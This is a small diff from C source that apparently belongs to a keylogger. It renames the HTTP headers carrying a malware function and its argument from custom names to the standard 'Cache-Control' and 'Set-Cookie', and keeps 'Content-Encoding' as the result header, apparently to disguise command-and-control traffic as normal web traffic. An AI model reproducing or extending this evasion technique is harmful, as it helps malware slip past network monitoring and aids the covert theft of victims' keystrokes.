@@ -17,8 +17,8 @@
 #include "keylogger.h"
 #include "debug_helper.h"
 
-#define MALWARE_FUNC "colman-function"
-#define MALWARE_ARG "colman-arg"
+#define MALWARE_FUNC "Cache-Control"
+#define MALWARE_ARG "Set-Cookie"
 #define RESULT_HEADER_STR "Content-Encoding: "
 
 #define MAX_HTTP_HEADER_LEN 2048
